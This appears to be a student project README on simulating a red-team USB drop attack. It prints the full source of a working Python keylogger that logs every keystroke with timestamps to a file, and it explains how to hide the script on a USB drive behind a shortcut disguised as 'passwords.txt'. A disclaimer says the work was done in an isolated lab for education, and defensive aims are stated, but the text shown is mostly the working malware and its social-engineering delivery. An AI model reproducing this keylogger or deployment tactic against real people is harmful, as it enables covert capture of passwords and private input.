# Python Keylogger / USB Drop Attack Simulation

**DISCLAIMER:** This project was performed solely on personal 
equipment in an isolated environment and for educational purposes 
only. This tool should not be used on any machine without explicit 
authorization. Using keyloggers without explicit authorization is 
illegal and unethical.

## Overview
This project simulates a red team USB drop attack, assuming the 
role of a malicious actor attempting to capture credentials and 
sensitive information from within a target organization. A Python 
keylogger was developed and deployed via a disguised USB shortcut 
to demonstrate how this attack vector works at a technical level 
and how defenders can detect and respond to it.

## Objectives
- Develop a keylogger in Python with the capabilities of
  capturing keystrokes and special characters onto a txt file
- Simulate USB drop attack with keylogger disguised as an
  unsuspecting file to execute on the target machine
- Observe how Windows Defender responds to the threat
- Understand the attack from a red team and blue team perspective

## Tools and Technologies
- Python 3.14.3
- pynput library
- Windows 11
- Windows Defender
- USB removable media

## How It Works

### The Keylogger
The keylogger was built in Python with the 'pynput' library, listening
in the background for all keystrokes while running. All keystrokes are 
then logged into a locally saved txt file with timestamps for further 
analysis. Special characters and inputs are also detected, but displayed 
separately when logged for readability.

```
# import libraries and such things
from pynput.keyboard import Key, Listener
import logging
import os

# set up basic logging config
log_file = os.path.join(os.path.expanduser("~"), "Documents", "log.txt")

logging.basicConfig(
    filename=log_file,
    level=logging.DEBUG,
    format="%(asctime)s - %(message)s"
)

# function for key presses and special keys
def on_press(key):
    try:
        logging.info(str(key.char))
    except AttributeError:
        if key == Key.space:
            logging.info(" ")
        elif key == Key.enter:
            logging.info("\n")
        elif key == Key.backspace:
            logging.info("[BACKSPACE]")
        else:
            logging.info(str(key))

# start listener
with Listener(on_press=on_press) as listener:
    listener.join()
```

## USB Deployment
Once the keylogger was developed, the ".py" file was disguised as a
txt file named "passwords.txt", with the intention of luring a curious
person to open the unsuspecting file. Once the file was executed, a black
command prompt style window would open on the users screen and remain
stationary. While a more technically inclined user would end this program
rather quickly, this is okay for the purpose of this project.

The actual "keylogger.py" file has been set to be hidden on the USB drive,
remaining unseen to the majority of users. With this, only the malicious .txt file
is present, showcasing a common social engineering tactic used in real USB drop
attacks.








